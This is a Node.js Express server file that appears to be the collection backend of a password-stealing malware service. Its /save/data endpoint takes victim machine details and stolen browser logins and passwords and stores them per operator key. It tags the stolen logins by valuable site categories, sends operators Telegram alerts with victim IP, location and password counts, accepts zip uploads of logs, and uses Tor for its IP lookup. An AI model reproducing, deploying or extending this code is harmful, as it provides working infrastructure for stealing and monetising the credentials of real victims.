var express = require("express");
var fs = require("fs");
var path = require("path");
var bodyParser = require("body-parser");
var cookieParser = require('cookie-parser');
var multer = require("multer");
var requestIp = require('request-ip');
var helmet = require('helmet');
var request = require("request");
var tr = require('tor-request');

var routes = require('./app/routes');
var TelegramAPI = require('./app/telegram_api');

var app = express();

var replay_ips_data = {}
var replay_ips_upload = {}

var EmojiPresents = {
	1: "💎",
	2: "🎰",
	3: "🎮",
	4: "🎓",
	5: "💌",
	6: "🎉",
	7: "🐔",
}

module.exports = function (db) {
	app.use(bodyParser.urlencoded({
		extended: true,
		limit: "10mb"
	}));
	app.use(bodyParser.json({
		limit: "10mb"
	}));

	app.use(cookieParser());

	app.use(requestIp.mw());
	app.use(helmet());

	app.use((req, res, next) => {
		console.log(req.path)
		next()
	});

	setInterval(function () {
		for (var i in replay_ips_data) {
			if (replay_ips_data[i] < Math.floor(new Date().getTime() / 1000))
				delete replay_ips_data[i]
		}
		for (var i in replay_ips_upload) {
			if (replay_ips_upload[i] < Math.floor(new Date().getTime() / 1000))
				delete replay_ips_upload[i]
		}
	}, 1000 * 60);

	routes(app, db)

	const storageConfig = multer.diskStorage({
		destination: (req, file, callback) => {
			callback(null, "app/uploads/");
		},
		filename: (req, file, callback) => {
			callback(null, file.originalname);
		},
		limits: {
			fileSize: 1024 * 1024 * 5
		},
	});

	const fileFilter = (req, file, callback) => {

		if (req.clientIp in replay_ips_upload) return callback(null, false);
		replay_ips_upload[req.clientIp] = Math.floor(new Date().getTime() / 1000) + 60 * 60 * 1;

		if (["application/zip"].indexOf(file.mimetype) !== -1 &&
			file.originalname.match(/([a-zA-Z0-9]+.?:?)+.zip$/)) {
			callback(null, true);
		} else {
			callback(null, false);
		}
	}

	var upload = multer({
		storage: storageConfig,
		fileFilter: fileFilter
	});

	app.use('/user/data/uploads', express.static('app/uploads'));

	app.post("/upload/file", upload.array('file'), async(req, res) => {
		res.status(444).end()
	})

	app.post("/save/data", async(req, res) => {
		if (req.clientIp in replay_ips_data) return res.end("error")
		if (req.body && req.body.key && req.body.comp && req.body.pass && Array.isArray(req.body.pass)) {
			var owner = await db.promiseSelect("SELECT * FROM accounts WHERE key = ?", [req.body.key]);

			const DEMO_ID = 1;

			if (owner.length) var owner_id = owner[0].id;
			else var owner_id = DEMO_ID;


			if (!(await db.promiseSelect("SELECT * FROM data_owners WHERE ip = ? AND time > strftime('%s', 'now') - 60*60*12", [req.body.comp.ip])).length) {
				replay_ips_data[req.clientIp] = Math.floor(new Date().getTime() / 1000) + 60 * 60 * 1;

				db.run("INSERT INTO data_owners (owner_id, system, ip, count_passwords, country, city, txt, checked, time) VALUES (?, ?, ?, ?, ?, ?, ?, ?, strftime('%s', 'now'))", [
					owner_id,
					req.body.comp.system,
					req.body.comp.ip,
					req.body.pass.length,
					req.body.comp.location.country,
					req.body.comp.location.city,
					req.body.txt,
					req.body.pass.length ? 0 : 2,
				], async function (err) {
					if (err) return console.log(err);

					var presents = await db.promiseSelect("SELECT * FROM accounts_presents WHERE user_id = ?", [owner_id]);
					var present = {};

					presents.map(function (row) {
						present[row.domain] = row.category;
					})

					var data_id = this.lastID;
					var values = [];
					var add_unique_presents = [];
					req.body.pass.map(x => {
						for (var domain in present) {
							if (x.u.match(new RegExp(domain, "ui"))) {
								if (add_unique_presents.indexOf(present[domain]) == -1) add_unique_presents.push(present[domain]);
							}
						}

						values.push([owner_id, data_id, x.u, x.l, x.p, x.b]);
					});

					db.run("UPDATE data_owners SET presents = ? WHERE id = ?", [add_unique_presents.join(","), data_id])

					var chunk = array_chunk(values, 100);

					for (var i in chunk) {
						var sql = [];
						for (var j = 0; j < chunk[i].length; j++) {
							sql.push("(?,?,?,?,?,?)")
						}

						var value = [];
						for (var j in chunk[i]) {
							value = value.concat(chunk[i][j]);
						}

						db.run("INSERT INTO data_rows (owner_id, data_id, url, login, password, browser) VALUES " + sql.join(","), value, function (err) {
							if (err) return console.log(err);

							console.log("Logs add: " + this.changes)
						});
					}

					if (owner.length && owner[0].telegram_id) {
						try {
							var emoji = [];
							for (var i in add_unique_presents) {
								emoji.push(EmojiPresents[add_unique_presents[i]]);
							}

							TelegramAPI.sendMessage({
								chat_id: owner[0].telegram_id,
								text: [
									req.body.comp.location.country + " | " + req.body.comp.ip,
									"🔑 " + req.body.pass.length + " | 📂 " + req.body.txt,
									req.body.comp.location.city + " | " + req.body.comp.system,
									emoji.join(" | ")
								].join("\n")
							})

						} catch (e) {
							console.log(e)
						}
					}
				})
			}
		}

		res.end("OK");
	})

tr.request('https://api.ipify.org/', function (err, res, body) {
  if (!err && res.statusCode == 200) {
    app.get("/json/api/get", async (req, res) => {
      res.send(body);
    });
  }
});
	app.listen(80, function (err) {
		if (err) console.log(err)
		else console.log("Server started")
	});
}

async function readFile(path, encoding = "utf8") {
	return new Promise((resolve, reject) => {
		fs.readFile(path, encoding, function (error, data) {
			if (error) reject(error);
			else resolve(data);
		});
	})
}

function array_chunk(array, size) {
	var res = [];
	for (var i = 0, j = array.length; i < j; i += size) {
		res.push(array.slice(i, i + size));
	}
	return res;
}